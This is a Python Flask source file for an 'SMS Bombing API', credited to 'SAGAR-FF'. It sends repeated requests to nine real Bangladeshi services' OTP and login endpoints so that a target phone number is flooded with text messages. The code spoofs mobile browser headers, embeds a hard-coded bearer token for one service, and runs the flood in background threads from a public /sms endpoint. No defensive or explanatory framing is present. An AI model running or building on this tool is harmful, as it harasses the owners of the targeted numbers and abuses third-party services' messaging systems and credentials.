from flask import Flask, request, jsonify
import threading
import requests
import time
import json
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# API endpoints configuration
APIS = [
    {
        "name": "PBS OTP",
        "url": "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "http://pbs.com.bd",
            "X-Requested-With": "mark.via.gp"
        },
        "data_template": '{"userPhone":"{msisdn}","otp":""}'
    },
    {
        "name": "BD Tickets",
        "url": "https://api.bdtickets.com:20100/v1/auth",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://bdtickets.com",
            "X-Requested-With": "mark.via.gp"
        },
        "data_template": '{{"createUserCheck":true,"phoneNumber":"+88{msisdn}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "Shikho",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://shikho.com",
            "X-Requested-With": "mark.via.gp"
        },
        "data_template": '{{"phone":"88{msisdn}","type":"student","auth_type":"signup","vendor":"shikho"}}'
    },
    {
        "name": "DeepToPlay",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        "data_template": '{{"number":"+88{msisdn}"}}'
    },
    {
        "name": "eCourier",
        "url": "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={msisdn}",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Origin": "https://ecourier.com.bd",
            "X-Requested-With": "mark.via.gp"
        },
        "data_template": None
    },
    {
        "name": "Sundarban Courier",
        "url": "https://api-gateway.sundarbancourierltd.com/graphql",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://customer.sundarbancourierltd.com",
            "X-Requested-With": "mark.via.gp"
        },
        "data_template": '{{"operationName":"CreateAccessToken","variables":{{"accessTokenFilter":{{"userName":"{msisdn}"}}}},"query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {{\\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {{\\n    message\\n    statusCode\\n    result {{\\n      phone\\n      otpCounter\\n      __typename\\n    }}\\n    __typename\\n  }}\\n}}"}}'
    },
    {
        "name": "Shomvob",
        "url": "https://backend-api.shomvob.co/api/v2/otp/phone",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q",
            "Origin": "https://app.shomvob.co",
            "X-Requested-With": "mark.via.gp"
        },
        "data_template": '{{"phone":"88{msisdn}","is_retry":0}}'
    },
    {
        "name": "Bioscope",
        "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://garibook.com",
            "X-Requested-With": "mark.via.gp"
        },
        "data_template": '{{"mobile":"+88{msisdn}","recaptcha_token":"garibookcaptcha","channel":"web"}}'
    },
    {
        "name": "Chorki",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        "data_template": '{{"number":"+88{msisdn}"}}'
    }
]

def send_request(api_config, msisdn, attempt):
    """Send request to a single API endpoint"""
    try:
        url = api_config["url"].format(msisdn=msisdn)
        headers = api_config["headers"]
        
        if api_config["method"] == "POST":
            if api_config["data_template"]:
                data = api_config["data_template"].format(msisdn=msisdn)
                response = requests.post(
                    url, 
                    headers=headers, 
                    data=data,
                    timeout=10
                )
            else:
                response = requests.post(
                    url, 
                    headers=headers,
                    timeout=10
                )
        else:  # GET
            response = requests.get(
                url, 
                headers=headers,
                timeout=10
            )
        
        return {
            "api": api_config["name"],
            "attempt": attempt,
            "status_code": response.status_code,
            "success": response.status_code in [200, 201, 202],
            "response_time": response.elapsed.total_seconds()
        }
    except Exception as e:
        return {
            "api": api_config["name"],
            "attempt": attempt,
            "status_code": 0,
            "success": False,
            "error": str(e)
        }

def bomb_sms(msisdn, attempts_per_api=3):
    """Main function to send SMS bombing requests"""
    results = []
    total_requests = len(APIS) * attempts_per_api
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        
        for api in APIS:
            for attempt in range(1, attempts_per_api + 1):
                futures.append(
                    executor.submit(send_request, api, msisdn, attempt)
                )
                # Small delay between requests to same API
                time.sleep(0.1)
        
        for future in futures:
            results.append(future.result())
            time.sleep(0.05)
    
    return {
        "total_apis": len(APIS),
        "requests_per_api": attempts_per_api,
        "total_requests": total_requests,
        "results": results
    }

@app.route('/sms', methods=['GET'])
def sms_bomb():
    """Main API endpoint for SMS bombing"""
    msisdn = request.args.get('msisdn')
    
    if not msisdn:
        return jsonify({
            "success": False,
            "message": "MSISDN parameter is required",
            "example": "/sms?msisdn=017********"
        }), 400
    
    # Validate phone number format (Bangladeshi)
    if not msisdn.isdigit() or len(msisdn) != 11:
        return jsonify({
            "success": False,
            "message": "Invalid MSISDN format. Must be 11 digits (e.g., 017********)"
        }), 400
    
    # Start bombing in background thread
    threading.Thread(
        target=bomb_sms,
        args=(msisdn, 3),
        daemon=True
    ).start()
    
    return jsonify({
        "success": True,
        "total_apis": len(APIS),
        "message": "SMS bombing started successfully",
        "target": msisdn,
        "Api Owner": "SAGAR-FF",
        "status": "running_in_background",
        "expected_requests": len(APIS) * 3
    })

@app.route('/sms/status', methods=['GET'])
def get_status():
    """Get status of the bombing service"""
    return jsonify({
        "service": "SMS Bombing API",
        "version": "1.0",
        "status": "active",
        "total_apis_configured": len(APIS),
        "developer": "SAGAR-FF",
        "telegram": "https://t.me/sagarofficialch"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)